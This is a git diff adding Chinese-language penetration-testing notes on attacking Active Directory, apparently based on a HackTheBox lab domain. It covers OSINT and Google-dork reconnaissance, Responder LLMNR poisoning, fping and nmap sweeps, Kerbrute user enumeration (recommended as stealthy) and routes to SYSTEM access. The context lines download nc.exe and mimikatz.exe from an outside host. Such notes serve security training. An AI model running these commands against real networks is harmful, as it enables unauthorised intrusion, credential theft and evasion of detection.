@@ -1034,3 +1034,108 @@ Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\U
 GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
 ```
 
+# 六、AD域攻击
+
+**信息收集**
+
+外部侦察内容：
+
+ip、域名及子域名、DNS记录、相关新闻、引用链接、任何有用的pdf/word文档、招聘信息、代码硬编码或注释、社工泄露账户（反正就是任何公开发表的东西中去寻找蛛丝马迹）===>形成关联网
+
+```
+https://www.iana.org/ 搜索美洲的 arin
+https://www.ripe.net/ 搜索欧洲的 RIPE
+https://bgp.he.net/
+
+以下是针对知名的DNS服务器（比如8.8.8.8）的DNS记录
+https://securitytrails.com/
+www.domaintools.com/
+https://lookup.icann.org/en
+
+社交媒体网站、新闻文章、“关于我们”、“联系我们”等
+
+https://github.com/
+https://www.exploit-db.com/google-hacking-database
+https://grayhatwarfare.com/
+
+https://haveibeenpwned.com/ 确定电子邮件泄露
+
+https://github.com/trufflesecurity/truffleHog
+https://buckets.grayhatwarfare.com/
+
+```
+
+名词解释：
+
+ASN：自治系统号，一个自治系统是一个在技术和管理上由单一机构控制的网络集合，通常由一个ISP、大学、企业或数据中心提供商运营，所有使用 **统一的路由策略** 的网络都可以组成一个 AS。用于 **BGP（边界网关协议）路由**，每个公网 IP 都归属于一个 ASN，被广泛用于 CDN、防火墙、访问控制、地域封锁等。
+
+缩小范围之后，进行主动枚举：
+
+- 可以对名称服务器进行nslookup,将其添加到Hosts文件
+
+- 搜寻pdf,email
+
+  ```
+  filetype:pdf inurl:inlanefreight.com
+  intext:"@inlanefreight.com" inurl:inlanefreight.com
+  ```
+
+```
+https://github.com/initstring/linkedin2username
+https://dehashed.com/
+构建密码
+```
+
+进入到内部网络后可以做的动作：
+
+可以使用 tcpdump 将捕获保存到 .pcap 文件，将其传输到另一台主机，然后在 Wireshark 中打开它。
+
+```
+tcpdump -l eth
+```
+
+ `pktmon.exe`已添加到 Windows 10 的所有版本中，
+
+[Responder](https://github.com/lgandx/Responder-Windows) 是一种用于侦听、分析和毒化 `LLMNR`、`NBT-NS` 和 `MDNS` 请求和响应的工具。
+
+```
+responder -I ens224 -A 
+```
+
+[Fping](https://fping.org/) 为我们提供了与标准 ping 应用程序类似的功能，因为它利用 ICMP 请求和回复来联系主机并与之交互。fping 的亮点在于它能够同时针对多个主机的列表发出 ICMP 数据包，并且具有可脚本性。
+
+```
+fping -asgq 172.16.5.0/23 #a显示活动的目标；s在扫描结束时打印统计信息；g从CIDR网路生成目标列表；q不显示每个目标的结果
+```
+
+使用Nmap执行专注于 AD 服务通常附带的标准协议的扫描，例如 DNS、SMB、LDAP 和 Kerberos 等。
+
+```
+nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
+```
+
+[Kerbrute](https://github.com/ropnop/kerbrute) 可以成为域帐户枚举的更隐蔽选项。它利用了 Kerberos 预身份验证失败通常不会触发日志或警报的事实。我们将 Kerbrute 与 [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames) 的 `jsmith.txt` 或 `jsmith2.txt` 用户列表结合使用。
+
+安装过程
+
+```
+git clone https://github.com/ropnop/kerbrute.git
+make help
+make all
+ls dist/
+. 运行 
+添加到环境变量
+```
+
+使用
+
+```shell-session
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+```
+
+有几种方法可以在主机上获得 SYSTEM 级访问权限，包括但不限于：
+
+- 远程 Windows 漏洞，例如 MS08-067、EternalBlue 或 BlueKeep。
+- 滥用在 `SYSTEM 帐户`上下文中运行的服务，或使用 [Juicy Potato](https://github.com/ohpe/juicy-potato) 滥用服务帐户 `SeImpersonate` 权限。
+- Windows 操作系统漏洞（如 Windows 10 Task Scheduler 0-day）中的本地权限提升缺陷。
+- 使用本地帐户在已加入域的主机上获得管理员访问权限，并使用 Psexec 启动 SYSTEM cmd 窗口。
